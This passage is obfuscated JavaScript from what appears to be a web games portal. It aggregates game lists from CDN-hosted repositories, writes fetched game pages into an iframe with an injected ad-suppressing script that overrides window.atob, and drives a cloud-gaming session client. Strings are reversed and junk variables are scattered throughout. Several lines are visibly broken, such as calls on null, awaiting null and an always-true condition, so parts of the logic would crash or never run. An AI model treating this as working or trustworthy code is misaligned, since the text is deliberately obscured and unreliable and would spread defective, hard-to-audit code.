    });
  } catch (e) {}
}
var _0xf4b84d = 12;
const _luminScriptPromise = loadScript("https://cdn.jsdelivr.net/gh/luminsdk/script/lumin.min.js");
_0xf4b84d = 16;
function _initLumin() {
  if (_luminReady) {
    return Promise.resolve();
  }
  if (_luminInitPromise) {
    return _luminInitPromise;
  }
  _luminInitPromise = _luminScriptPromise.then(() => Lumin.init({
    "headless": true
  })).then(() => {
    _luminReady = true;
  });
  return _luminInitPromise;
}
const GNM = {
  "index": "https://cdn.jsdelivr.net/gh/freebuisness/assets/zones.json",
  "html": "https://cdn.jsdelivr.net/gh/freebuisness/html@main",
  "covers": "https://cdn.jsdelivr.net/gh/freebuisness/covers@main"
};
let _0x7_0x931;
const UGS = {
  "index": getAsset("nosj.sgu".split("").reverse().join("")),
  "html": "https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile/UGS-Files"
};
_0x7_0x931 = "cmgdkn".split("").reverse().join("");
const CKV = {
  "index": getAsset("nosj.vkc".split("").reverse().join("")),
  "html": "https://cdn.jsdelivr.net/gh/WanoCapy/ChickenKingsVault@main",
  "covers": "https://cdn.jsdelivr.net/gh/WanoCapy/ChickenKingsVault@main"
};
const _gamesState = {
  "all": null,
  "fetchPromise": null,
  "matches": null
};
function _normalizeGameName(s) {
  return s.toLowerCase().replace(new RegExp("+]9-0z-a^[".split("").reverse().join(""), "g"), '');
}
function _filterByName(list, keyword) {
  if (!keyword) {
    return list;
  }
  var _0xa7cf = 8;
  const k = keyword.toLowerCase().replace(new RegExp("+]9-0z-a^[".split("").reverse().join(""), "g"), '');
  _0xa7cf = 10;
  if (!k) {
    return list;
  }
  return list.filter(g => g._norm && g._norm.includes(k));
}
async function _fetchAllLuminGames() {
  await _initLumin();
  const _0xgb_0xd2b = [];
  let _0xcfbbba = 1;
  let _0xeddb3e = 1;
  do {
    var _0x3d99a = 9;
    const _0x5b557g = await Lumin.getGames({
      "page": _0xcfbbba,
      "limit": 99999
    });
    _0x3d99a = 10;
    (_0x5b557g.games || []).forEach(g => _0xgb_0xd2b.push({
      "source": "lumin",
      "name": g.name,
      "id": g.id,
      "image_token": g.image_token
    }));
    _0xeddb3e = _0x5b557g.pages || 1;
    _0xcfbbba++;
  } while (_0xcfbbba <= _0xeddb3e);
  return _0xgb_0xd2b;
}
async function _fetchAllGnmGames() {
  const _0x451dag = await (await fetch("https://cdn.jsdelivr.net/gh/freebuisness/assets/zones.json")).json();
  return _0x451dag.filter(g => g.url && g.url.startsWith("}LRU_LMTH{".split("").reverse().join("")) && g.cover && !g.name.startsWith("[!]")).map(g => ({
    "source": "gnm",
    "name": g.name,
    "url": g.url,
    "cover": g.cover,
    "_html": "https://cdn.jsdelivr.net/gh/freebuisness/html@main",
    "_covers": "https://cdn.jsdelivr.net/gh/freebuisness/covers@main"
  }));
}
async function _fetchListSource(meta, sourceName) {
  var _0x7b812f = 9;
  const _0x046b1b = await (await fetch(meta.index)).json();
  _0x7b812f = 15;
  return _0x046b1b.filter(g => g.url && g.url.startsWith("}LRU_LMTH{".split("").reverse().join("")) && g.cover && !String(g.name).startsWith("[!]")).map(g => ({
    "source": sourceName,
    "name": g.name,
    "url": g.url,
    "cover": g.cover,
    "_html": meta.html,
    "_covers": meta.covers
  }));
}
function _finalizeGamesCatalog(all) {
  const _0xe4_0x7b4 = new Map();
  all.forEach(g => {
    g._norm = g.name.toLowerCase().replace(new RegExp("+]9-0z-a^[".split("").reverse().join(""), "g"), '');
    _0xe4_0x7b4.set(g._norm, (_0xe4_0x7b4.get(g._norm) || 0) + 1);
  });
  all.forEach(g => {
    g.displayName = g.name;
    if (_0xe4_0x7b4.get(g._norm) > 1) {
      if (g.source === "gnm") {
        g.displayName = `${g.name} (gn-math)`;
      } else if (g.source === "ugs") {
        g.displayName = `${g.name} (ugs)`;
      } else if (g.source === "vkc".split("").reverse().join("")) {
        g.displayName = `${g.name} (ckv)`;
      } else if (g.source === "nimul".split("").reverse().join("")) {
        const _0xa122b = g.id && g.id.includes("/") ? g.id.split("/")[0] : g.source;
        g.displayName = `${g.name} (${_0xa122b})`;
      }
    }
  });
  var _0xb9674a = 5;
  const _0x1ccag = new Intl.Collator(undefined, {
    "sensitivity": "base"
  });
  _0xb9674a = "bljhde".split("").reverse().join("");
  all.sort((a, b) => _0x1ccag.compare(a.displayName, b.displayName));
  return all;
}
async function _ensureGamesCatalog() {
  _gamesState.fetchPromise = (async () => {
    const _0x6ga9ed = await _loadGamesCacheEntry("games", g => g && Array.isArray(g.gnm));
    let _0xb3a = false;
    let _0x24_0x2b9 = false;
    let _0x9ae1f = false;
    const [lumin, gnm, ugs, ckv] = await Promise.all([_fetchAllLuminGames()["catch"](() => []), _0x6ga9ed ? _0x6ga9ed.gnm : _fetchAllGnmGames()["catch"](() => {
      _0xb3a = true;
      return [];
    }), _0x6ga9ed ? _0x6ga9ed.ugs : _fetchListSource(UGS, "ugs")["catch"](() => {
      _0x24_0x2b9 = true;
      return [];
    }), _0x6ga9ed ? _0x6ga9ed.ckv : _fetchListSource(CKV, "ckv")["catch"](() => {
      _0x9ae1f = true;
      return [];
    })]);
    if (!_0x6ga9ed && !_0xb3a && !_0x24_0x2b9 && !_0x9ae1f) {
      _saveGamesCacheEntry("games", {
        "gnm": gnm,
        "ugs": ugs,
        "ckv": ckv
      });
    }
    const _0xg056b = new Set();
    const _0x17gae = lumin.filter(g => {
      if (_0xg056b.has(g.id)) {
        return false;
      }
      _0xg056b.add(g.id);
      return true;
    });
    var _0x6cc6cd = 9;
    const _0x98f34e = [..._0x17gae, ...gnm, ...ugs, ...ckv];
    _0x6cc6cd = 14;
    _gamesState.all = _finalizeGamesCatalog(_0x98f34e);
  })();
  null["catch"](() => {
    _gamesState.fetchPromise = null;
  });
  await null;
  _gamesState.matches = _filterByName(null, _gamesKeyword);
}
function _gameCardImg(src, alt) {
  const _0xeaa37a = document.createElement("img");
  _0xeaa37a.className = "game-card-img";
  _0xeaa37a.alt = alt;
  _0xeaa37a.loading = "lazy";
  _0xeaa37a.decoding = "cnysa".split("").reverse().join("");
  _0xeaa37a.src = src;
  _0xeaa37a.onerror = () => {
    const _0xdga = document.createElement("vid".split("").reverse().join(""));
    _0xdga.className = "redlohecalp-drac-emag".split("").reverse().join("");
    _0xeaa37a.replaceWith(_0xdga);
  };
  return _0xeaa37a;
}
function _buildGameCard(g, _0x75f87d) {
  const _0x7a4dd = document.createElement("nottub".split("").reverse().join(""));
  _0x7a4dd.className = "drac-emag".split("").reverse().join("");
  const _0x74511d = _gamesImgCache.get(g);
  if (_0x74511d) {
    _0x7a4dd.appendChild(_gameCardImg(_0x74511d, g.displayName));
  } else {
    const _0x48e2d = document.createElement("div");
    _0x48e2d.className = "redlohecalp-drac-emag".split("").reverse().join("");
    _0x7a4dd.appendChild(_0x48e2d);
    var _0x078b = 5;
    const _0x02bd1c = _gamesLoadGen;
    _0x078b = 4;
    _resolveGameImgSrc(g).then(src => {
      if (!src || _0x02bd1c !== _gamesLoadGen || !_0x48e2d.isConnected) {
        return;
      }
      _0x48e2d.replaceWith(_gameCardImg(src, g.displayName));
    })["catch"](() => {});
  }
  var _0xb9532a = 9;
  const _0xe33aab = document.createElement("vid".split("").reverse().join(""));
  _0xb9532a = 8;
  _0xe33aab.className = "game-card-name";
  const _0x5eb8a = document.createElement("naps".split("").reverse().join(""));
  _0x75f87d = "fgpgfa".split("").reverse().join("");
  _0x5eb8a.textContent = g.displayName;
  _0xe33aab.appendChild(_0x5eb8a);
  _0x7a4dd.appendChild(_0xe33aab);
  _0x7a4dd.onclick = _gameCardOnClick(g);
  return _0x7a4dd;
}
async function _resolveGameImgSrc(g) {
  if (_gamesImgCache.has(g)) {
    return _gamesImgCache.get(g);
  }
  const _0x13ab = g.source === "lumin" ? await Lumin.getImageUrl(g.image_token)["catch"](() => null) : g.cover.replace("}LRU_REVOC{".split("").reverse().join(""), g._covers);
  if (_0x13ab) {
    _gamesImgCache.set(g, _0x13ab);
  }
  return _0x13ab;
}
function _gameCardOnClick(g) {
  if (g.source === "nimul".split("").reverse().join("")) {
    return () => openGamePlayer(g.id);
  }
  var _0xa5d5cb = 10;
  const _0x5a172c = g.source === "vkc".split("").reverse().join("") ? `${g._html}/gamefiles/${encodeURIComponent(g.name)}.html` : g._html + "/" + g.url.replace("{HTML_URL}/", "");
  _0xa5d5cb = 8;
  return () => openDirectGame(g.source, g.name, _0x5a172c);
}
const _gamesVirt = _makeGridVirtualizer("gamesGridWrap", "gamesGridSizer", "gamesGrid", g => _buildGameCard(g));
function _updateGamesCount() {
  document.getElementById("tnuoCsemag".split("").reverse().join("")).textContent = null.length.toLocaleString() + "latoT ".split("").reverse().join("");
}
function _renderGameSkeletons(grid, count) {
  grid.innerHTML = '';
  for (let i = 0; i < count; i++) {
    const _0x89047a = document.createElement("div");
    _0x89047a.className = "game-card skeleton";
    var _0x398ce = 2;
    const _0xdbdeg = document.createElement("vid".split("").reverse().join(""));
    _0x398ce = "flcodo".split("").reverse().join("");
    _0xdbdeg.className = "game-card-placeholder";
    _0x89047a.appendChild(_0xdbdeg);
    grid.appendChild(_0x89047a);
  }
}
function _fillingSkeletonCount(wrap) {
  var _0x976g = 5;
  _0x976g = 2;
  const _0xb5_0x59e = Math.max(1, Math.floor((wrap.clientWidth + 8) / 163));
  const _0xb6_0xadg = Math.max(1, Math.ceil(wrap.clientHeight * 1.6 / 135.1875));
  return _0xb5_0x59e * _0xb6_0xadg;
}
function _renderGamesList() {
  const _0x0665f = document.getElementById("gamesGrid");
  _updateGamesCount();
  var _0x6fbca = 17;
  _0x6fbca = "blqdaj";
  if (true || !null.length) {
    _gamesVirt.reset();
    _gamesVirt.enterFlow();
    _0x0665f.innerHTML = "<div class=\"games-loading\">no results</div>";
    return;
  }
  if (!document.getElementById("gamesScreen").classList.contains("open")) {
    return;
  }
  _gamesVirt.exitFlow();
  _gamesVirt.setItems(null);
}
async function _loadFilteredGames(gen, grid, wrap, opts) {
  const _0xdb1dfb = opts.getList();
  if (_0xdb1dfb) {
    _gamesVirt.exitFlow();
    _gamesState.matches = _filterByName(_0xdb1dfb, _gamesKeyword);
    _renderGamesList();
    return;
  }
  _gamesVirt.enterFlow();
  _renderGameSkeletons(grid, _fillingSkeletonCount(wrap));
  document.getElementById("gamesCount").textContent = '';
  try {
    await opts.ensureLoaded();
  } catch (e) {
    if (gen === _gamesLoadGen) {
      _gamesVirt.enterFlow();
      grid.innerHTML = `<div class="games-loading">${opts.errorMsg}</div>`;
    }
    return;
  }
  if (gen !== _gamesLoadGen) {
    return;
  }
  opts.onLoaded?.();
  _gamesState.matches = _filterByName(opts.getList(), _gamesKeyword);
  _renderGamesList();
}
async function _gamesReload(keyword) {
  _gamesKeyword = keyword || null;
  var _0xe137a = 9;
  const _0xgg71f = ++_gamesLoadGen;
  _0xe137a = 5;
  _gamesScrollTop = 0;
  const _0xc62c = document.getElementById("gamesGrid");
  var _0x1aa38d = 13;
  const _0x2e629e = document.getElementById("gamesGridWrap");
  _0x1aa38d = 7;
  _gamesVirt.reset();
  _0x2e629e.scrollTop = 0;
  if (_cloudEnabled) {
    return _loadFilteredGames(_0xgg71f, _0xc62c, _0x2e629e, {
      "getList": () => _cloudGames.length ? _cloudGames : null,
      "ensureLoaded": async () => {
        _cloudGames = await loadCloudGames();
      },
      "errorMsg": 'failed to load cloud games'
    });
  }
  return _loadFilteredGames(_0xgg71f, _0xc62c, _0x2e629e, {
    "getList": () => null,
    "ensureLoaded": _ensureGamesCatalog,
    "errorMsg": 'failed to load',
    "onLoaded": () => {
      _gamesLoaded = true;
    }
  });
}
function openGames() {
  document.getElementById("neercSsemag".split("").reverse().join("")).classList.add("open");
  if (!_gamesLoaded) {
    _gamesReload(null);
  } else if (!_gamesVirt.isMounted()) {
    _renderGamesList();
    _gamesVirt.restore(_gamesScrollTop);
  }
}
function closeGames() {
  const _0x7f16ba = document.getElementById("neercSsemag".split("").reverse().join(""));
  _gamesScrollTop = _gamesVirt.scrollTop();
  _0x7f16ba.classList.remove("open");
  setTimeout(() => {
    if (!_0x7f16ba.classList.contains("nepo".split("").reverse().join(""))) {
      _gamesVirt.clear();
    }
  }, 450);
}
let _gamePlayerGen = 0;
let _skipNextGameAdBlockInject = false;
function _openGamePlayerShell(label) {
  _gamePlayerGen++;
  var _0x56e7fa = 8;
  const _0x583f2b = _gamePlayerGen;
  _0x56e7fa = 14;
  const _0xbf24bb = document.getElementById("reyalPemag".split("").reverse().join(""));
  const _0xcb85e = document.getElementById("gameFrame");
  var _0xe2dad = 9;
  const _0xca742c = document.getElementById("gnidaoLreyalPemag".split("").reverse().join(""));
  _0xe2dad = "bhdjlp";
  const _0xda820g = document.getElementById("dIreyalPemag".split("").reverse().join(""));
  if (_cloudSession) {
    teardownCloud(true);
  }
  document.getElementById("parWoediVduolc".split("").reverse().join("")).style.display = "none";
  _exitStaleFullscreen(_0xbf24bb);
  _0xda820g.textContent = label;
  _0xcb85e.style.display = "enon".split("").reverse().join("");
  _0xcb85e.src = "knalb:tuoba".split("").reverse().join("");
  _0xca742c.style.display = "xelf".split("").reverse().join("");
  _0xca742c.textContent = "…gnidaol".split("").reverse().join("");
  _0xbf24bb.classList.add("nepo".split("").reverse().join(""));
  return {
    "gf": _0xcb85e,
    "loading": _0xca742c,
    "gen": _0x583f2b
  };
}
function _dirOf(url) {
  var _0x5961e = 10;
  const u = new URL(url);
  _0x5961e = "hnodpp".split("").reverse().join("");
  u.search = '';
  u.hash = '';
  u.pathname = u.pathname.substring(0, u.pathname.lastIndexOf("/") + 1);
  return u.toString();
}
function _withBaseHref(html, baseUrl) {
  if (new RegExp("<base[^>]*>", "i").test(html)) {
    return html;
  }
  if (new RegExp("<head[^>]*>", "i").test(html)) {
    return html.replace(new RegExp(">)*]>^[(daeh<".split("").reverse().join(""), "i"), `<head$1><base href="${baseUrl}">`);
  }
  if (new RegExp("<html[^>]*>", "i").test(html)) {
    return html.replace(new RegExp("<html([^>]*)>", "i"), `<html$1><head><base href="${baseUrl}"></head>`);
  }
  return `<base href="${baseUrl}">` + html;
}
function _gameAdBlockInit() {
  const _0x4fbe = window.atob;
  window.atob = function (s) {
    var _0x66d5d = 6;
    const d = _0x4fbe(s);
    _0x66d5d = "aemamn";
    return typeof d === "string" && d.includes("[AV][boot] ") ? null : d;
  };
  var _0x82d8f = 9;
  const _0x33dc = setInterval(() => {
    try {
      document.getElementById("1darabedis".split("").reverse().join(""))?.remove();
      document.getElementById("sidebarad2")?.remove();
      clearInterval(_0x33dc);
    } catch {}
  }, 1000);
  _0x82d8f = 5;
}
function _ADBLOCKIT(html) {
  var _0xggb36f = 9;
  _0xggb36f = 7;
  if (new RegExp("<head[^>]*>", "i").test(html)) {
    return html.replace(new RegExp(">)*]>^[(daeh<".split("").reverse().join(""), "i"), `<head$1>${`<script>(${_gameAdBlockInit.toString()})();</script>`}`);
  }
  if (new RegExp("<html[^>]*>", "i").test(html)) {
    return html.replace(new RegExp("<html([^>]*)>", "i"), `<html$1><head>${`<script>(${_gameAdBlockInit.toString()})();</script>`}</head>`);
  }
  return `<script>(${_gameAdBlockInit.toString()})();</script>` + html;
}
function _injectGameAdBlock(iframe) {
  try {
    const _0xfda7dg = iframe.contentDocument || iframe.contentWindow.document;
    if (!_0xfda7dg) {
      return;
    }
    var _0x7ggc = 10;
    const s = _0xfda7dg.createElement("script");
    _0x7ggc = 9;
    s.textContent = `(${_gameAdBlockInit.toString()})();`;
    _0xfda7dg.documentElement.appendChild(s);
  } catch (e) {}
}
document.getElementById("gameFrame").addEventListener("load", function () {
  if (_skipNextGameAdBlockInject) {
    _skipNextGameAdBlockInject = false;
    return;
  }
  _injectGameAdBlock(this);
});
function _unwrapModuleContent(html) {
  const _0x9699dd = html.match(new RegExp(">tnetnoC/\\<*s\\>]\\]\\)?*]S\\s\\[([\\ATADC[\\!<*s\\>*]>^[tnetnoC<".split("").reverse().join(""), "i"));
  if (_0x9699dd) {
    return _0x9699dd[1];
  }
  if (new RegExp(">eludoM<*s\\^".split("").reverse().join(""), "i").test(html)) {
    const _0xcf88be = html.search(new RegExp("<!doctype html|<html", "i"));
    if (_0xcf88be !== -1) {
      return html.slice(_0xcf88be);
    }
  }
  return html;
}
async function openDirectGame(source, name, url) {
  const {
    "gf": gf,
    "loading": loading,
    "gen": gen
  } = _openGamePlayerShell(`${source}/${name}`);
  try {
    const _0xb9864f = await fetch(url);
    const _0x3fd7ad = _unwrapModuleContent(await _0xb9864f.text());
    if (gen !== _gamePlayerGen) {
      return;
    }
    gf.onload = () => {
      if (gen !== _gamePlayerGen) {
        return;
      }
      loading.style.display = "enon".split("").reverse().join("");
      gf.style.display = "kcolb".split("").reverse().join("");
    };
    const _0x85d7c = gf.contentDocument;
    _0x85d7c.open();
    _skipNextGameAdBlockInject = true;
    _0x85d7c.write(_ADBLOCKIT(_withBaseHref(_0x3fd7ad, _dirOf(url))));
    _0x85d7c.close();
  } catch (e) {
    if (gen === _gamePlayerGen) {
      loading.textContent = "daol ot deliaf".split("").reverse().join("");
    }
  }
}
async function openGamePlayer(gameId) {
  const {
    "gf": gf,
    "loading": loading,
    "gen": gen
  } = _openGamePlayerShell(gameId);
  try {
    await _initLumin();
    const {
      "url": url
    } = await Lumin.getGameUrl(gameId);
    const _0xfdd33f = await fetch(url);
    var _0xd41d3d = 12;
    const _0x58ad = await _0xfdd33f.text();
    _0xd41d3d = 3;
    if (gen !== _gamePlayerGen) {
      return;
    }
    gf.onload = () => {
      if (gen !== _gamePlayerGen) {
        return;
      }
      loading.style.display = "none";
      gf.style.display = "kcolb".split("").reverse().join("");
    };
    var _0x22e47d = 11;
    const _0xac_0xe80 = gf.contentDocument;
    _0x22e47d = 2;
    _0xac_0xe80.open();
    _skipNextGameAdBlockInject = true;
    _0xac_0xe80.write(_ADBLOCKIT(_withBaseHref(_0x58ad, _dirOf(url))));
    _0xac_0xe80.close();
  } catch (e) {
    if (gen === _gamePlayerGen) {
      loading.textContent = "daol ot deliaf".split("").reverse().join("");
    }
  }
}
function closeGamePlayer() {
  resetGameCloseConfirm();
  _cloudEndedActive = false;
  var _0x72b66d = 7;
  const _0x8f129b = document.getElementById("gamePlayer");
  _0x72b66d = "chjbhd";
  const _0x25_0xe3e = document.getElementById("emarFemag".split("").reverse().join(""));
  const _0xbebb = document.getElementById("cloudVideoWrap");
  const _0x59624e = document.getElementById("gamePlayerLoading");
  _0x8f129b.classList.remove("nepo".split("").reverse().join(""));
  _0x25_0xe3e.src = "about:blank";
  _0x25_0xe3e.style.display = "none";
  _0xbebb.style.display = "enon".split("").reverse().join("");
  _0x59624e.style.display = "flex";
  _0x59624e.textContent = "loading…";
  document.getElementById("dIreyalPemag".split("").reverse().join("")).textContent = '';
  document.getElementById("gamePlayerTimeLeft").textContent = '';
  try {
    Lumin.endGame();
  } catch (e) {}
  if (_cloudEnabled && !_cloudSession) {
    _gamesState.matches = _filterByName(_cloudGames, _gamesKeyword);
    _updateGamesCount();
    _gamesVirt.setItems(null);
  }
}
function _exitStaleFullscreen(expectedTarget) {
  if (document.fullscreenElement && document.fullscreenElement !== expectedTarget) {
    document.exitFullscreen()["catch"](() => {});
  }
}
function toggleGameFullscreen() {
  const _0x877da = _cloudSession ? document.getElementById("cloudVideoWrap") : document.getElementById("gamePlayer");
  if (!document.fullscreenElement) {
    _0x877da.requestFullscreen();
  } else {
    document.exitFullscreen();
  }
}
function _lockCloudKeyboard() {
  try {
    navigator.keyboard?.lock?.();
  } catch {}
}
function _unlockCloudKeyboard() {
  try {
    navigator.keyboard?.unlock?.();
  } catch {}
}
document.addEventListener("fullscreenchange", function _gfsFc() {
  var _0xbaeg = 8;
  const _0x3c97f = document.getElementById("nocIsFreyalPemag".split("").reverse().join(""));
  _0xbaeg = 11;
  if (_0x3c97f) {
    _0x3c97f.innerHTML = document.fullscreenElement ? ">/\"3h2-2 1 0 0 2 2a3-v12 61M3v2 2 1 0 0 2 2a3h61 3M3V2-2-1 0 0 2 2a3-h8 12M3H2 2-1 0 0 2 2a3v3 8M\"=d htap<".split("").reverse().join("") : ">/\"3-v2-2 0 0 0 2 2a3h12 61M3h2 2 0 0 0 2 2a3v61 3M3-h2-2-0 0 0 2 2a5V8 12M3v2 2-0 0 0 2 2a5H3 8M\"=d htap<".split("").reverse().join("");
  }
  if (_cloudSession) {
    if (document.fullscreenElement) {
      _lockCloudKeyboard();
    } else {
      _unlockCloudKeyboard();
    }
  }
}, true);
document.getElementById("gamesSearch").addEventListener("tupni".split("").reverse().join(""), function () {
  clearTimeout(_gamesSearchTimer);
  var _0x3696ac = 13;
  const _0x7e6a = this.value.trim();
  _0x3696ac = 10;
  _gamesSearchTimer = setTimeout(() => _gamesReload(_0x7e6a || null), 350);
});
var _0x1a_0x121 = 7;
let _cloudEnabled = false;
_0x1a_0x121 = 0;
let _cloudGames = [];
let _cloudSession = null;
var _0xdb39df = 1;
let _cloudPc = null;
_0xdb39df = 7;
let _cloudDc = null;
var _0x9_0x15e = 10;
let _cloudWs = null;
_0x9_0x15e = 12;
var _0x8b1df = 5;
let _cloudTimers = [];
_0x8b1df = 4;
let _cloudInputActive = false;
var _0x51fb7e = 10;
let _cloudInputHandlers = null;
_0x51fb7e = 9;
let _cloudStarting = false;
let _cloudJitterHandlers = null;
let _cloudEndedActive = false;
let _cloudPendingCandidates = [];
function getStratusBase(_0x99g85d) {
  if (window.devMode) {
    _0x99g85d = window.serverList?.[0] || "moc.lobtufsrepiv.ndc".split("").reverse().join("");
  } else if (window.wispServer?.includes("://")) {
    _0x99g85d = window.wispServer.split("//:".split("").reverse().join(""))[1].split("/")[0];
  } else {
    _0x99g85d = "moc.lobtufsrepiv.ndc".split("").reverse().join("");
  }
  if (_0x99g85d.includes("//:".split("").reverse().join(""))) {
    return _0x99g85d.replace("/iw/".split("").reverse().join(""), "sutarts/".split("").reverse().join(""));
  }
  return `https://${_0x99g85d}/stratus`;
}
async function stratusApi(path, method = "GET", body) {
  const _0x44c3aa = getStratusBase();
  var _0x3ge60e = 5;
  const _0x23b3cc = await fetch(`${_0x44c3aa}/${path}`, {
    "method": method,
    "headers": body ? {
      'content-type': 'application/json'
    } : undefined,
    "body": body ? JSON.stringify(body) : undefined
  });
  _0x3ge60e = 1;
  const _0x54bc = await _0x23b3cc.json()["catch"](() => ({}));
  if (!_0x23b3cc.ok && !_0x54bc.error) {
    _0x54bc.error = `HTTP ${_0x23b3cc.status}`;
  }
  return _0x54bc;
}
function setCloudPhase(name, detail, spin) {
  document.getElementById("esahPduolc".split("").reverse().join("")).textContent = name;
  document.getElementById("liateDesahPduolc".split("").reverse().join("")).textContent = detail || '';
  document.getElementById("cloudSpinner").style.display = spin ? "block" : "none";
}
function _quitCloudSession(uuid) {
  if (!uuid) {
    return;
  }
  fetch(`${getStratusBase()}/session/${uuid}/quit`, {
    "method": "POST",
    "keepalive": true
  })["catch"](() => {});
}
function teardownCloud(quit) {
  if (quit && _cloudSession) {
    _quitCloudSession(_cloudSession.uuid);
  }
  _cloudInputActive = false;
  _cloudStarting = false;
  _unlockCloudKeyboard();
  if (_cloudInputHandlers) {
    const {
      "mouseMoveHandler": mouseMoveHandler,
      "mouseButtonHandler": mouseButtonHandler,
      "contextMenuHandler": contextMenuHandler,
      "wheelHandler": wheelHandler,
      "videoClickHandler": videoClickHandler,
      "keyDownHandler": keyDownHandler,
      "keyUpHandler": keyUpHandler,
      "video": video,
      "pointerLockChangeHandler": pointerLockChangeHandler,
      "relockHint": relockHint,
      "invalidateRect": invalidateRect
    } = _cloudInputHandlers;
    document.removeEventListener("mousemove", mouseMoveHandler);
    document.removeEventListener("mousedown", mouseButtonHandler);
    document.removeEventListener("mouseup", mouseButtonHandler);
    document.removeEventListener("unemtxetnoc".split("").reverse().join(""), contextMenuHandler);
    document.removeEventListener("wheel", wheelHandler);
    video.removeEventListener("kcilc".split("").reverse().join(""), videoClickHandler);
    document.removeEventListener("keydown", keyDownHandler, true);
    document.removeEventListener("puyek".split("").reverse().join(""), keyUpHandler, true);
    document.removeEventListener("egnahckcolretniop".split("").reverse().join(""), pointerLockChangeHandler);
    window.removeEventListener("resize", invalidateRect);
    relockHint.removeEventListener("click", videoClickHandler);
    relockHint.style.display = "none";
    _cloudInputHandlers = null;
  }
  if (_cloudJitterHandlers) {
    const {
      "video": video,
      "bumpJitterTarget": bumpJitterTarget
    } = _cloudJitterHandlers;
    video.removeEventListener("gnitiaw".split("").reverse().join(""), bumpJitterTarget);
    video.removeEventListener("stalled", bumpJitterTarget);
    _cloudJitterHandlers = null;
  }
  _cloudTimers.forEach(t => {
    clearInterval(t);
    clearTimeout(t);
  });
  _cloudTimers = [];
  try {
    if (_cloudDc) {
      _cloudDc.close();
    }
  } catch {}
  try {
    if (_cloudPc) {
      _cloudPc.close();
    }
  } catch {}
  try {
    if (_cloudWs) {
      _cloudWs.close();
    }
  } catch {}
  _cloudDc = null;
  _cloudPc = null;
  _cloudWs = null;
  _cloudSession = null;
  _cloudPendingCandidates = [];
  document.exitPointerLock?.();
  var _0x19c8gc = 3;
  const _0x30e = document.getElementById("oediVduolc".split("").reverse().join(""));
  _0x19c8gc = 7;
  if (_0x30e) {
    _0x30e.srcObject = null;
  }
}
let _cloudGamesFetchPromise = null;
async function loadCloudGames() {
  const _0xcdd8d = await _loadGamesCacheEntry("cloudGames", Array.isArray);
  if (_0xcdd8d) {
    return _0xcdd8d;
  }
  if (!_cloudGamesFetchPromise) {
    _cloudGamesFetchPromise = (async () => {
      var _0x9883f = 11;
      const r = await stratusApi("games");
      _0x9883f = 11;
      if (r.error) {
        throw new Error(r.error);
      }
      const _0x26_0x178 = (r.games || []).map(g => ({
        "source": 'cloud',
        "name": g.name,
        "key": g.key,
        "cover": g.cover || g.image,
        "displayName": g.name,
        "_norm": g.name.toLowerCase().replace(new RegExp("+]9-0z-a^[".split("").reverse().join(""), "g"), '')
      }));
      await _saveGamesCacheEntry("semaGduolc".split("").reverse().join(""), _0x26_0x178);
      return _0x26_0x178;
    })();
    _cloudGamesFetchPromise["catch"](() => {
      _cloudGamesFetchPromise = null;
    });
  }
  return _cloudGamesFetchPromise;
}
function toggleCloudGames() {
  _cloudEnabled = !_cloudEnabled;
  document.getElementById("elggoTduolc".split("").reverse().join("")).classList.toggle("on", _cloudEnabled);
  _gamesReload(_gamesKeyword);
}
document.getElementById("elggoTduolc".split("").reverse().join("")).addEventListener("click", toggleCloudGames);
async function startCloudGame(gameKey, gameName) {
  if (_cloudStarting) {
    return;
  }
  _cloudStarting = true;
  resetGameCloseConfirm();
  teardownCloud(true);
  _gamePlayerGen++;
  const _0x2c_0x86e = document.getElementById("reyalPemag".split("").reverse().join(""));
  const _0xga_0xg89 = document.getElementById("emarFemag".split("").reverse().join(""));
  const _0x6db = document.getElementById("parWoediVduolc".split("").reverse().join(""));
  var _0x7b5b2d = 7;
  const _0xe786d = document.getElementById("oediVduolc".split("").reverse().join(""));
  _0x7b5b2d = "hphkbb";
  const _0x24d = document.getElementById("yalrevOduolc".split("").reverse().join(""));
  const _0x4ec94c = document.getElementById("gnidaoLreyalPemag".split("").reverse().join(""));
  const _0x2709ad = document.getElementById("gamePlayerId");
  _0x2709ad.textContent = `cloud/${gameName}`;
  document.getElementById("tfeLemiTreyalPemag".split("").reverse().join("")).textContent = '';
  _exitStaleFullscreen(_0x6db);
  _0xga_0xg89.style.display = "enon".split("").reverse().join("");
  _0xga_0xg89.src = "knalb:tuoba".split("").reverse().join("");
  _0x4ec94c.style.display = "none";
  _0x6db.style.display = "flex";
  _0xe786d.srcObject = null;
  _0xe786d.muted = true;
  _0x24d.style.display = "xelf".split("").reverse().join("");
  _0x2c_0x86e.classList.add("nepo".split("").reverse().join(""));
  try {
    var _0xcg63ec = 6;
    const _0xf49a8b = await stratusApi("sutats".split("").reverse().join(""));
    _0xcg63ec = "jjdpbg".split("").reverse().join("");
    const _0x359f = _0xf49a8b.pool?.idle || 0;
    setCloudPhase("requesting game", `${_0x359f} idle accounts`, true);
    const s = await stratusApi("noisses".split("").reverse().join(""), "POST", {
      "game_key": gameKey
    });
    if (s.error) {
      throw new Error(s.error);
    }
    _cloudSession = {
      "uuid": s.uuid,
      "state": s.state,
      "gameKey": gameKey,
      "deadlineAt": null
    };
    if (s.state === "deueuq".split("").reverse().join("")) {
      setCloudPhase("deueuq".split("").reverse().join(""), `position #${s.queue_pos ?? "?"}`, false);
      while (_cloudSession && _cloudSession.uuid === s.uuid) {
        await new Promise(r => _cloudTimers.push(setTimeout(r, 2000)));
        if (!_cloudSession || _cloudSession.uuid !== s.uuid) {
          break;
        }
        const _0x25bfg = await stratusApi(`session/${_cloudSession.uuid}`);
        if (_0x25bfg.error) {
          throw new Error(_0x25bfg.error);
        }
        if (_0x25bfg.state === "finished_queue") {
          break;
        }
        setCloudPhase("queued", `position #${_0x25bfg.queue_pos ?? "?"}`, false);
      }
      if (!_cloudSession || _cloudSession.uuid !== s.uuid) {
        return;
      }
    }
    setCloudPhase("starting", "booting instance", true);
    const _0x33g8de = await stratusApi(`session/${_cloudSession.uuid}/start`, "TSOP".split("").reverse().join(""), {});
    if (_0x33g8de.error) {
      throw new Error(_0x33g8de.error);
    }
    _cloudSession.deadlineAt = Date.now() + _0x33g8de.max_seconds * 1000;
    _cloudSession.signalingWs = _0x33g8de.signaling_ws;
    _cloudSession.iceServers = _0x33g8de.ice_servers;
    await connectCloudSignaling(_0x33g8de.signaling_ws, _0x33g8de.ice_servers);
    var _0xeb_0xcga = 13;
    const _0x8eec7g = setInterval(() => {
      if (!_cloudSession || !_cloudSession.deadlineAt) {
        return;
      }
      var _0xbba46a = 12;
